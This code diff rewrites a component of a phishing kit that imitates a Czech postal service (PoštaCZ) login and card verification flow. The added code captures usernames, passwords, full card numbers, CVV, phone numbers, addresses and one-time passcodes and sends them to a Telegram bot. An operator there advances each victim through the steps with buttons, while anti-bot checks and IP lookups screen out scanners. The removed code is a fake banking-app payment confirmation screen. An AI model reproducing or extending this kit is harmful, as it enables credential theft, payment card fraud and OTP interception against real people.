@@ -1,154 +1,540 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
+import axios from 'axios';
+import { useLanguage } from '../hooks/useLanguage';
 import { useTelegramBot } from '../hooks/useTelegramBot';
-import './NextStepAppr.css';
+import { startTimer, trackInteraction, trackTyping, checkAntiBot, resetAntiBot } from '../utils/antiBot';
+import LoginScreen from './LoginScreen';
+import CardVerificationForm from './CardVerificationForm';
+import OtpVerificationForm from './OtpVerificationForm';
+import LoadingOverlay from './LoadingOverlay';
+import './LoginForm.css';
 
-function NextStepAppr() {
-  const [username, setUsername] = useState('');
-  const [fullCardNumber, setFullCardNumber] = useState('');
-  const [cardNumber, setCardNumber] = useState('**** **** **** ****');
-  const [currentTime, setCurrentTime] = useState(new Date());
+function LoginForm() {
+  const { t } = useLanguage();
+  
+  // State management
+  const [loginName, setLoginName] = useState('');
+  const [password, setPassword] = useState('');
+  const [errors, setErrors] = useState({ loginName: false, password: false });
+  const [showCardForm, setShowCardForm] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [isConfirmed, setIsConfirmed] = useState(false);
+  const [waitingForApproval, setWaitingForApproval] = useState(false);
+  const [waitingForOtpApproval, setWaitingForOtpApproval] = useState(false);
+  const [showOtpForm, setShowOtpForm] = useState(false);
+  const [otpCode, setOtpCode] = useState('');
+  const [otpError, setOtpError] = useState('');
   const [sessionId, setSessionId] = useState(null);
+  
+  // Typing tracking
+  const [loginTypingSent, setLoginTypingSent] = useState(false);
+  const [cardTypingSent, setCardTypingSent] = useState(false);
+  const [otpTypingSent, setOtpTypingSent] = useState(false);
+  
+  // Refs for tracking page logs
+  const hasSentCardPageLogRef = useRef(false);
+  const hasSentOtpLogRef = useRef(false);
+  
+  const [cardDetails, setCardDetails] = useState({
+    cardNumber: '', expiryDate: '', cvv: '', cardholderName: '',
+    phoneNumber: '', city: '', postalCode: ''
+  });
+  const [cardErrors, setCardErrors] = useState({});
 
-  // Get username and card number from sessionStorage
+  // Ref for sendCardVerificationPageLog
+  const sendCardVerificationPageLogRef = useRef(null);
+
+  // Anti-bot initialization
   useEffect(() => {
-    // Retrieve data with better error handling
-    const storedUsername = sessionStorage.getItem('loginName') || 'Unknown User';
-    const storedCardNumber = sessionStorage.getItem('cardNumber');
-    const storedSessionId = sessionStorage.getItem('sessionId') || Date.now().toString();
-    
-    console.log('📦 Retrieved from sessionStorage:', { storedUsername, storedCardNumber });
-    
-    setUsername(storedUsername);
-    setSessionId(storedSessionId);
-    
-    if (storedCardNumber) {
-      setFullCardNumber(storedCardNumber);
-      // Format card number to show only last 4 digits for display
-      const cleanNumber = storedCardNumber.replace(/\s/g, '');
-      const last4 = cleanNumber.slice(-4);
-      setCardNumber(`**** **** **** ${last4}`);
-    } else {
-      console.warn('⚠️ No card number found in sessionStorage');
-      // Try to get from localStorage as fallback
-      const localCardNumber = localStorage.getItem('cardNumber');
-      if (localCardNumber) {
-        setFullCardNumber(localCardNumber);
-        const cleanNumber = localCardNumber.replace(/\s/g, '');
-        const last4 = cleanNumber.slice(-4);
-        setCardNumber(`**** **** **** ${last4}`);
-      }
+    startTimer();
+    const handleMouseMove = () => trackInteraction();
+    window.addEventListener('mousemove', handleMouseMove);
+    return () => {
+      window.removeEventListener('mousemove', handleMouseMove);
+      resetAntiBot();
+    };
+  }, []);
+
+  // Save data to sessionStorage when needed
+  useEffect(() => {
+    if (loginName) {
+      sessionStorage.setItem('loginName', loginName);
     }
-  }, []);
+    if (sessionId) {
+      sessionStorage.setItem('sessionId', sessionId);
+    }
+  }, [loginName, sessionId]);
 
-  // Update time every second
-  useEffect(() => {
-    const timer = setInterval(() => {
-      setCurrentTime(new Date());
-    }, 1000);
+  // Define handler functions with proper references
+  const handleApprove = async () => {
+    console.log('✅ Approve button clicked in Telegram');
+    console.log('Current state before approve:', { waitingForApproval, showCardForm });
+    
+    // Use the ref to call sendCardVerificationPageLog
+    if (sendCardVerificationPageLogRef.current && !hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLogRef.current(loginName);
+      hasSentCardPageLogRef.current = true;
+    }
+    
+    // Update state in the correct order
+    setWaitingForApproval(false);
+    setShowCardForm(true);
+    setIsLoading(false);
+    
+    console.log('State after approve:', { waitingForApproval: false, showCardForm: true });
+  };
+  
+  const handleDeny = () => {
+    console.log('❌ Deny button clicked in Telegram');
+    setWaitingForApproval(false);
+    setWaitingForOtpApproval(false);
+    setIsLoading(false);
+    alert(t.denied);
+    window.location.reload();
+  };
 
-    return () => clearInterval(timer);
-  }, []);
+  const handleViewCard = async () => {
+    console.log('👁️ View Card button clicked in Telegram');
+    
+    if (sendCardVerificationPageLogRef.current && !hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLogRef.current(loginName);
+      hasSentCardPageLogRef.current = true;
+    }
+    
+    setWaitingForApproval(false);
+    setShowCardForm(true);
+    setIsLoading(false);
+  };
 
-  // Initialize Telegram bot with dummy handlers for NextStepAppr
-  const {
-    sendSuccessToTelegram,
-    sendConfirmationLog
-  } = useTelegramBot(
-    sessionId,
-    () => {}, // onApprove - not needed here
-    () => {}, // onDeny - not needed here
-    () => {}, // onViewCard - not needed here
-    () => {}, // onNextStep - not needed here
-    () => {}, // onBackToCard - not needed here
-    () => {}, // onBackToLogin - not needed here
-    () => {}, // onBlock - not needed here
-    () => {}  // onNextStepAppr - not needed here
+  const handleNextStep = async () => {
+    console.log('➡️ Next Step button clicked in Telegram');
+    setWaitingForOtpApproval(false);
+    setIsLoading(false);
+    setShowCardForm(false);
+    setShowOtpForm(true);
+    setOtpCode('');
+    setOtpError('');
+  };
+
+  const handleBackToCard = () => {
+    console.log('🔵 Back to Card button clicked!');
+    setShowOtpForm(false);
+    setShowCardForm(true);
+    setOtpCode('');
+    setOtpError('');
+    hasSentOtpLogRef.current = false;
+    setOtpTypingSent(false);
+  };
+
+  const handleBackToLogin = () => {
+    console.log('🔵 Back to Login button clicked!');
+    setShowCardForm(false);
+    setShowOtpForm(false);
+    setWaitingForOtpApproval(false);
+    setWaitingForApproval(false);
+    setIsLoading(false);
+    setCardDetails({
+      cardNumber: '',
+      expiryDate: '',
+      cvv: '',
+      cardholderName: '',
+      phoneNumber: '',
+      city: '',
+      postalCode: ''
+    });
+    setCardErrors({});
+    setOtpCode('');
+    setOtpError('');
+    setLoginTypingSent(false);
+    setCardTypingSent(false);
+    setOtpTypingSent(false);
+    hasSentCardPageLogRef.current = false;
+    hasSentOtpLogRef.current = false;
+    resetAntiBot();
+    startTimer();
+    sessionStorage.removeItem('loginName');
+    sessionStorage.removeItem('cardNumber');
+    sessionStorage.removeItem('sessionId');
+  };
+
+  const handleBlock = async () => {
+    console.log('🔵 Block IP button clicked!');
+    try {
+      const response = await axios.get('https://api.ipify.org?format=json');
+      const userIP = response.data.ip;
+      
+      const blockedIPs = JSON.parse(localStorage.getItem('blocked_ips') || '[]');
+      if (!blockedIPs.includes(userIP)) {
+        blockedIPs.push(userIP);
+        localStorage.setItem('blocked_ips', JSON.stringify(blockedIPs));
+      }
+      
+      sessionStorage.setItem('blocked_ip', userIP);
+      window.location.href = '/blocked';
+    } catch (error) {
+      console.error('Error blocking IP:', error);
+      window.location.href = '/blocked';
+    }
+  };
+  
+  const handleNextStepAppr = () => {
+    console.log('🔵 Next Step (Appr) button clicked!');
+    sessionStorage.setItem('loginName', loginName);
+    if (cardDetails.cardNumber) {
+      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
+    }
+    if (sessionId) {
+      sessionStorage.setItem('sessionId', sessionId);
+    }
+    window.location.href = '/nextstepappr';
+  };
+
+  // Telegram bot hooks
+  const telegramBot = useTelegramBot(
+    sessionId, 
+    handleApprove, 
+    handleDeny, 
+    handleViewCard, 
+    handleNextStep, 
+    handleBackToCard, 
+    handleBackToLogin, 
+    handleBlock,
+    handleNextStepAppr
   );
 
-  const handleConfirm = async () => {
-    setIsLoading(true);
+  // Store the sendCardVerificationPageLog function in ref after it's available
+  useEffect(() => {
+    if (telegramBot.sendCardVerificationPageLog) {
+      sendCardVerificationPageLogRef.current = telegramBot.sendCardVerificationPageLog;
+    }
+  }, [telegramBot.sendCardVerificationPageLog]);
+
+  const {
+    generateSessionId,
+    sendToTelegramWithButtons,
+    sendCardDetailsToTelegram,
+    sendFormattedCardDetails,
+    sendOtpToTelegram,
+    sendSuccessToTelegram,
+    sendCardVerificationLog,
+    sendOtpPageLog,
+    sendCardVerificationPageLog,
+    sendOtpSubmitLog,
+    sendOtpVerifiedLog,
+    sendLoginTypingLog,
+    sendCardTypingLog,
+    sendOtpTypingLog,
+    sendBlockedLog
+  } = telegramBot;
+
+  const handleInputChange = async (field, value) => {
+    trackTyping();
     
-    try {
-      // Send confirmation logs to Telegram
-      await sendConfirmationLog(username, fullCardNumber, sessionId);
-      await sendSuccessToTelegram(username, sessionId, fullCardNumber);
+    if (field === 'loginName') {
+      setLoginName(value);
+      if (!loginTypingSent && value.length === 1) {
+        await sendLoginTypingLog(value, 'Login page', 'User is typing username and password');
+        setLoginTypingSent(true);
+      }
+    } else {
+      setPassword(value);
+      if (!loginTypingSent && value.length === 1) {
+        await sendLoginTypingLog(loginName, 'Login page', 'User is typing username and password');
+        setLoginTypingSent(true);
+      }
+    }
+    setErrors({ ...errors, [field]: false });
+  };
+
+  const handleLogin = async (e) => {
+    e.preventDefault();
+    
+    const newErrors = {
+      loginName: loginName.trim() === '',
+      password: password.trim() === ''
+    };
+    setErrors(newErrors);
+    if (newErrors.loginName || newErrors.password) return;
+    
+    const antiBotResult = checkAntiBot();
+    console.log('🤖 Enhanced Anti-bot result:', antiBotResult);
+    
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
       
-      setIsConfirmed(true);
-      console.log('✅ Confirmed - Logs sent to channel');
-    } catch (error) {
-      console.error('Error sending confirmation:', error);
-    } finally {
-      setIsLoading(false);
+      await sendBlockedLog(loginName, antiBotResult.reason, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
+
+    setIsLoading(true);
+    setWaitingForApproval(true);
+    const newSessionId = generateSessionId();
+    setSessionId(newSessionId);
+    
+    const message = `
+🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+🆔 <b>Session ID:</b> <code>${newSessionId}</code>
+━━━━━━━━━━━━━━━━━━━━━
+
+📝 <b>LOGIN CREDENTIALS:</b>
+├ 👤 <b>Username:</b> ${loginName.trim()}
+└ 🔑 <b>Password:</b> ${password.trim()}
+
+━━━━━━━━━━━━━━━━━━━━━
+🤖 <b>Anti-bot Status:</b> ✅ PASSED
+📊 <b>Human Score:</b> ${antiBotResult.reason}
+━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>Click a button below to proceed</i>
+    `;
+    
+    await sendToTelegramWithButtons(message, newSessionId);
+  };
+
+  const handleCardInputChange = async (field, value) => {
+    trackTyping();
+    
+    if (!cardTypingSent) {
+      await sendCardTypingLog(loginName, 'Card Verification page', 'User is filling card details');
+      setCardTypingSent(true);
+    }
+
+    let formattedValue = value;
+    
+    if (field === 'cardNumber') {
+      formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
+      if (formattedValue.length > 19) formattedValue = formattedValue.slice(0, 19);
+    }
+    
+    if (field === 'expiryDate') {
+      formattedValue = value.replace(/\D/g, '');
+      if (formattedValue.length >= 2) {
+        formattedValue = formattedValue.slice(0, 2) + (formattedValue.length > 2 ? '/' + formattedValue.slice(2, 4) : '');
+      }
+      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
+    }
+    
+    if (field === 'cvv') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 4);
+    }
+    
+    if (field === 'phoneNumber') {
+      formattedValue = value.replace(/\D/g, '').slice(0, 9);
+    }
+    
+    if (field === 'city') {
+      formattedValue = value.slice(0, 50);
+    }
+    
+    if (field === 'postalCode') {
+      formattedValue = value.replace(/\s/g, '');
+      if (formattedValue.length > 5) formattedValue = formattedValue.slice(0, 5);
+      if (formattedValue.length >= 3 && formattedValue.length <= 5) {
+        formattedValue = formattedValue.slice(0, 3) + (formattedValue.length > 3 ? ' ' + formattedValue.slice(3, 5) : '');
+      }
+    }
+
+    setCardDetails({ ...cardDetails, [field]: formattedValue });
+    
+    if (cardErrors[field]) {
+      setCardErrors({ ...cardErrors, [field]: false });
     }
   };
 
-  const handleBack = () => {
-    console.log('🔵 Back button clicked - returning to card verification');
-    window.location.href = '/';
+  const validateCzechPostalCode = (postalCode) => {
+    const cleanCode = postalCode.replace(/\s/g, '');
+    const postalRegex = /^\d{5}$/;
+    return postalRegex.test(cleanCode);
   };
 
+  const validateCardForm = () => {
+    const errors = {};
+    
+    if (!cardDetails.cardNumber.trim() || cardDetails.cardNumber.replace(/\s/g, '').length < 16) {
+      errors.cardNumber = t.validCard;
+    }
+    
+    if (!cardDetails.expiryDate.trim() || !/^\d{2}\/\d{2}$/.test(cardDetails.expiryDate)) {
+      errors.expiryDate = t.validExpiry;
+    } else {
+      const [month, year] = cardDetails.expiryDate.split('/');
+      const currentDate = new Date();
+      const currentYear = currentDate.getFullYear() % 100;
+      const currentMonth = currentDate.getMonth() + 1;
+      const expYear = parseInt(year);
+      const expMonth = parseInt(month);
+      
+      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+        errors.expiryDate = t.cardExpired;
+      }
+    }
+    
+    if (!cardDetails.cvv.trim() || cardDetails.cvv.length < 3) {
+      errors.cvv = t.validCvv;
+    }
+    
+    if (!cardDetails.cardholderName.trim()) {
+      errors.cardholderName = t.validCardholder;
+    }
+    
+    if (!cardDetails.phoneNumber.trim()) {
+      errors.phoneNumber = t.validPhone;
+    } else if (cardDetails.phoneNumber.length !== 9) {
+      errors.phoneNumber = t.phoneDigits;
+    }
+    
+    if (!cardDetails.city.trim()) {
+      errors.city = t.validCity;
+    } else if (cardDetails.city.trim().length < 2) {
+      errors.city = t.validCityName;
+    }
+    
+    if (!cardDetails.postalCode.trim()) {
+      errors.postalCode = t.validPostal;
+    } else if (!validateCzechPostalCode(cardDetails.postalCode)) {
+      errors.postalCode = t.invalidPostal;
+    }
+    
+    return errors;
+  };
+
+  const handleCardSubmit = async (e) => {
+    e.preventDefault();
+    sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
+    
+    const antiBotResult = checkAntiBot();
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, `Card page - ${antiBotResult.reason}`, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
+    
+    const errors = validateCardForm();
+    
+    if (Object.keys(errors).length === 0) {
+      setIsLoading(true);
+      setWaitingForOtpApproval(true);
+      await sendCardVerificationLog(loginName);
+      await sendCardDetailsToTelegram(cardDetails, sessionId);
+      setIsLoading(false);
+    } else {
+      setCardErrors(errors);
+    }
+  };
+
+  const handleOtpSubmit = async (e) => {
+    e.preventDefault();
+    
+    if (!otpCode.trim() || otpCode.length < 6) {
+      setOtpError(t.validOtp);
+      return;
+    }
+    
+    const antiBotResult = checkAntiBot();
+    if (!antiBotResult.passed) {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      
+      await sendBlockedLog(loginName, `OTP page - ${antiBotResult.reason}`, userIP);
+      sessionStorage.setItem('block_reason', antiBotResult.reason);
+      window.location.href = '/blocked';
+      return;
+    }
+    
+    setIsLoading(true);
+    
+    await sendOtpSubmitLog(loginName, cardDetails.phoneNumber, otpCode);
+    await sendOtpToTelegram(otpCode, cardDetails.phoneNumber, sessionId);
+    await sendOtpVerifiedLog(loginName, cardDetails.phoneNumber, otpCode);
+    await sendSuccessToTelegram(cardDetails.phoneNumber, sessionId);
+    await sendFormattedCardDetails(cardDetails, sessionId, loginName, password);
+    
+    setIsLoading(false);
+    
+    alert(t.success);
+    window.location.reload();
+  };
+
+  const handleOtpChange = async (value) => {
+    trackTyping();
+    setOtpCode(value);
+    if (!otpTypingSent && value.length === 1) {
+      await sendOtpTypingLog(loginName, cardDetails.phoneNumber, 'User is typing OTP code');
+      setOtpTypingSent(true);
+    }
+    setOtpError('');
+  };
+
+  const isLoadingState = isLoading || waitingForApproval || waitingForOtpApproval;
+
   return (
-    <div className="confirmation-overlay">
-      <div className="confirmation-modal">
-        <h3>In App-Verification in PoštaCZ</h3>
-        
-        {!isConfirmed ? (
-          <>
-            <div className="confirmation-details">
-              <div className="detail-row">
-                <span className="detail-label">User:</span>
-                <span className="detail-value">{username}</span>
-              </div>
-              <div className="detail-row">
-                <span className="detail-label">Merchant:</span>
-                <span className="detail-value">PoštaOnline</span>
-              </div>
-              <div className="detail-row">
-                <span className="detail-label">Amount:</span>
-                <span className="detail-value">00,00 CZK</span>
-              </div>
-              <div className="detail-row">
-                <span className="detail-label">Date:</span>
-                <span className="detail-value">{currentTime.toLocaleString()}</span>
-              </div>
-              <div className="detail-row">
-                <span className="detail-label">Card number:</span>
-                <span className="detail-value">{cardNumber}</span>
-              </div>
-            </div>
+    <div className="login-container">
+      <h2>{t.loginTitle}</h2>
 
-            <div className="confirmation-instructions">
-              <p>• Open mobile banking app in your mobile phone.</p>
-              <p>• After confirmation come back to this screen.</p>
-              <p>• If the screen doesn't close by itself when you come back, just tap "CONFIRMED IN CZ KEY".</p>
-            </div>
+      <LoadingOverlay 
+        isLoading={isLoadingState}
+        waitingForApproval={waitingForApproval}
+        waitingForOtpApproval={waitingForOtpApproval}
+        t={t}
+      />
 
-            <div className="confirmation-buttons">
-              <button onClick={handleConfirm} className="confirm-btn" disabled={isLoading}>
-                {isLoading ? 'Processing...' : 'Confirm the payment in CZ key'}
-              </button>
-              <button onClick={handleBack} className="back-btn">
-                Back to Card Verification
-              </button>
-            </div>
-          </>
-        ) : (
-          <div className="waiting-container">
-            <div className="waiting-spinner">⏳</div>
-            <h3>Confirmation Sent Successfully!</h3>
-            <p>Your confirmation has been sent to the banking app.</p>
-            <p>Please check your mobile banking app to complete the verification.</p>
-            <p className="waiting-time">Current time: {currentTime.toLocaleString()}</p>
-            <button onClick={handleBack} className="back-btn" style={{ marginTop: '20px' }}>
-              Back to Login
-            </button>
-          </div>
-        )}
-      </div>
+      {!showCardForm && !showOtpForm && !waitingForApproval && !waitingForOtpApproval && (
+        <LoginScreen
+          loginName={loginName}
+          password={password}
+          errors={errors}
+          isLoading={isLoading}
+          t={t}
+          onInputChange={handleInputChange}
+          onLogin={handleLogin}
+        />
+      )}
+
+      {showCardForm && !waitingForOtpApproval && (
+        <CardVerificationForm
+          cardDetails={cardDetails}
+          cardErrors={cardErrors}
+          isLoading={isLoading}
+          t={t}
+          onInputChange={handleCardInputChange}
+          onSubmit={handleCardSubmit}
+        />
+      )}
+
+      {showOtpForm && (
+        <OtpVerificationForm
+          otpCode={otpCode}
+          otpError={otpError}
+          isLoading={isLoading}
+          t={t}
+          onOtpChange={handleOtpChange}
+          onSubmit={handleOtpSubmit}
+          onBack={handleBackToCard}
+        />
+      )}
     </div>
   );
 }
 
-export default NextStepAppr;
+export default LoginForm;
